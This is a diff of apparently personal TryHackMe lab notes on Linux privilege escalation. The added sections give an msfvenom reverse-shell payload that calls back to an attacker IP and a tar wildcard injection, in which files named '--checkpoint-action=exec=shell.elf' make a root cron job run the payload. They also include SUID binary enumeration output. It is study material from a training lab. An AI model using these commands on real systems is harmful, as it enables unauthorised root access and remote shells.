@@ -1,5 +1,5 @@
 ---
-{"dg-publish":true,"permalink":"/try-hack-me-rooms/linux-priv-esc/","created":"2026-04-03T22:26:20.103+02:00","updated":"2026-04-04T18:02:42.376+02:00","dg-note-properties":{}}
+{"dg-publish":true,"permalink":"/try-hack-me-rooms/linux-priv-esc/","created":"2026-04-03T22:26:20.103+02:00","updated":"2026-04-04T18:29:28.281+02:00","dg-note-properties":{}}
 ---
 
 ![](/img/user/Attachments/redteaming2.png)
@@ -340,4 +340,94 @@ Removing the file
 
 
 ## Cron Jobs - Wildcards
+
+
+Checking **compress.sh** in the other cron job and seeing it uses `*` in the home directory
+
+**Command**
+`cat /usr/local/bin/compress.sh`
+
+Creating the exploit on local machine as per THM instructions
+
+```
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.141.140 LPORT=4444 -f elf -o shell.elf
+```
+
+Making it executable
+`chmod +x /home/user/shell.elf`
+
+Transferring the file to target via Python HTTP server. 
+
+Creating 2 files in home directory on ssh-box
+
+**Command**
+`touch /home/user/--checkpoint=1`
+
+**Command**
+`touch /home/user/--checkpoint-action=exec=shell.elf`
+
+When the tar command in the cron job runs, the wildcard (*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.
+
+-----------
+
+## SUID / SGID Executables - Known Exploits 
+
+Find all the SUID/SGID executables on the Debian :
+
+`find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
+
+```
+user@debian:~$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \;  
+2> /dev/null  
+-rwxr-sr-x 1 root shadow 19528 Feb 15  2011 /usr/bin/expiry  
+-rwxr-sr-x 1 root ssh 108600 Apr  2  2014 /usr/bin/ssh-agent  
+-rwsr-xr-x 1 root root 37552 Feb 15  2011 /usr/bin/chsh  
+-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudo  
+-rwxr-sr-x 1 root tty 11000 Jun 17  2010 /usr/bin/bsd-write  
+-rwxr-sr-x 1 root crontab 35040 Dec 18  2010 /usr/bin/crontab  
+-rwsr-xr-x 1 root root 32808 Feb 15  2011 /usr/bin/newgrp  
+-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudoedit  
+-rwxr-sr-x 1 root shadow 56976 Feb 15  2011 /usr/bin/chage  
+-rwsr-xr-x 1 root root 43280 Feb 15  2011 /usr/bin/passwd  
+-rwsr-xr-x 1 root root 60208 Feb 15  2011 /usr/bin/gpasswd  
+-rwsr-xr-x 1 root root 39856 Feb 15  2011 /usr/bin/chfn  
+-rwxr-sr-x 1 root tty 12000 Jan 25  2011 /usr/bin/wall  
+-rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so  
+-rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env  
+-rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2  
+-rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3  
+-rwsr-xr-x 1 root root 6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device  
+-rwsr-xr-x 1 root root 212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign  
+-rwsr-xr-x 1 root root 10592 Feb 15  2016 /usr/lib/pt_chown  
+-rwsr-xr-x 1 root root 36640 Oct 14  2010 /bin/ping6  
+-rwsr-xr-x 1 root root 34248 Oct 14  2010 /bin/ping  
+-rwsr-xr-x 1 root root 78616 Jan 25  2011 /bin/mount  
+-rwsr-xr-x 1 root root 34024 Feb 15  2011 /bin/su  
+-rwsr-xr-x 1 root root 53648 Jan 25  2011 /bin/umount  
+-rwsr-sr-x 1 root root 926536 Apr  4 12:28 /tmp/rootbash  
+-rwxr-sr-x 1 root shadow 31864 Oct 17  2011 /sbin/unix_chkpwd  
+-rwsr-xr-x 1 root root 94992 Dec 13  2014 /sbin/mount.nfs
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
